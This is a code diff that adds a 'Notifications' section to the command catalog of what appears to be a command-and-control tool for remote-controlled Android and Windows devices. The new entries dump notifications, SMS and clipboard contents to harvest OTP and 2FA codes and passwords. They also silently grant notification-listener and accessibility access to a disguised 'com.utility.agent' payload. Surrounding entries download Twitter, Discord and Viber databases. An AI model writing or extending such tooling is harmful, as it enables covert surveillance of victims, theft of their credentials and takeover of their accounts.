@@ -289,6 +289,22 @@ const COMMAND_CATALOG: C2Command[] = [
   { id: "twitter_db",            name: "download /data/data/com.twitter.android/databases/app.db",          category: "Social",    description: "Download Twitter/X database" },
   { id: "twitter_appdata",       name: "run post/android/capture/app_data -p com.twitter.android",          category: "Social",    description: "Twitter/X full app data" },
 
+  // ── Notifications ─────────────────────────────────────────
+  { id: "notif_dump_android",     name: "shell dumpsys notification --noredact",                              category: "Notifications", description: "Dump ALL current Android notifications (no root needed) — titles, bodies, app, channel" },
+  { id: "notif_history_root",     name: "shell cat /data/system/notification_log.xml",                       category: "Notifications", description: "Read persistent notification history log (root required)" },
+  { id: "notif_history_ce",       name: "shell cat /data/system_ce/0/notification_history.bin",              category: "Notifications", description: "Read CE notification history (Android 11+, root)" },
+  { id: "notif_listeners",        name: "shell settings get secure enabled_notification_listeners",           category: "Notifications", description: "List registered notification listener services on device" },
+  { id: "notif_grant_listener",   name: "shell cmd notification allow_listener com.utility.agent/.NotifListener", category: "Notifications", description: "Grant notification listener access to payload service (root)" },
+  { id: "notif_settings_grant",   name: "shell settings put secure enabled_notification_listeners com.utility.agent/.NotifListener", category: "Notifications", description: "Persist notification listener grant in secure settings" },
+  { id: "notif_otp_sms",          name: "dump_sms",                                                          category: "Notifications", description: "Dump SMS for OTP/2FA code extraction" },
+  { id: "notif_clipmon",          name: "shell while true; do dumpsys clipboard 2>/dev/null; sleep 5; done", category: "Notifications", description: "Continuous clipboard monitor — captures copied OTPs and passwords" },
+  { id: "notif_wpn_windows",      name: `download "C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Windows\\Notifications\\wpndatabase.db"`, category: "Notifications", description: "Download Windows WNS notification database (all toast push notifications)" },
+  { id: "notif_win_eventlog",     name: `shell powershell -c "Get-EventLog -LogName Application -Newest 50 | Format-List"`, category: "Notifications", description: "Read Windows Application event log (recent 50 entries)" },
+  { id: "notif_app_badge",        name: "shell content query --uri content://com.android.badge/badge",       category: "Notifications", description: "Query Android app badge notification counts" },
+  { id: "notif_media_session",    name: "shell dumpsys media_session",                                       category: "Notifications", description: "Dump active media sessions — what is playing on device" },
+  { id: "notif_accessibility",    name: "shell settings get secure enabled_accessibility_services",           category: "Notifications", description: "List active accessibility services (can read all screen content)" },
+  { id: "notif_enable_a11y",      name: "shell settings put secure enabled_accessibility_services com.utility.agent/.A11yService", category: "Notifications", description: "Enable payload accessibility service (reads all on-screen text, including popups)", dangerous: true },
+
   // ── Social Media — Discord / Viber / WeChat / Line ───────
   { id: "discord_db",            name: "download /data/data/com.discord/databases/",                        category: "Social",    description: "Download Discord local databases" },
   { id: "viber_db",              name: "download /data/data/com.viber.voip/databases/",                     category: "Social",    description: "Download Viber databases" },
